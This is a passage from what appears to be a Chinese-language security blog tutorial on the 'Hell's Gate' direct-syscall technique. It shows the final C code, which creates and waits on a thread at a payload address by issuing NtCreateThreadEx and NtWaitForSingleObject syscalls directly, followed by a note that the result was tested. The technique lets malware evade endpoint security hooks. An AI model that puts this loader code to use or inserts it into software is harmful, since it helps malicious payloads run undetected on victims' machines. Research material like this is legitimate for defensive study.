+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HANDLE hHostThread <span style="color:#f92672">=</span> INVALID_HANDLE_VALUE;
+</span></span><span style="display:flex;"><span>	HellsGate(pVxTable<span style="color:#f92672">-&gt;</span>NtCreateThreadEx.wSystemCall);
+</span></span><span style="display:flex;"><span>	status <span style="color:#f92672">=</span> HellDescent(<span style="color:#f92672">&amp;</span>hHostThread, <span style="color:#ae81ff">0x1FFFFF</span>, NULL, (HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Wait for 1 seconds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	LARGE_INTEGER Timeout;
+</span></span><span style="display:flex;"><span>	Timeout.QuadPart <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">50000000</span>;
+</span></span><span style="display:flex;"><span>	HellsGate(pVxTable<span style="color:#f92672">-&gt;</span>NtWaitForSingleObject.wSystemCall);
+</span></span><span style="display:flex;"><span>	status <span style="color:#f92672">=</span> HellDescent(hHostThread, TRUE, <span style="color:#f92672">&amp;</span>Timeout);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这里面就是设置调用号，然后进行系统调用</p>
 <p>最后运行下 尝试效果</p>
 <p><img src="/images/HellsGate/image-20220325085552422.png" alt="image-20220325085552422"></p>
 <h2 id="参考资料">参考资料</h2>
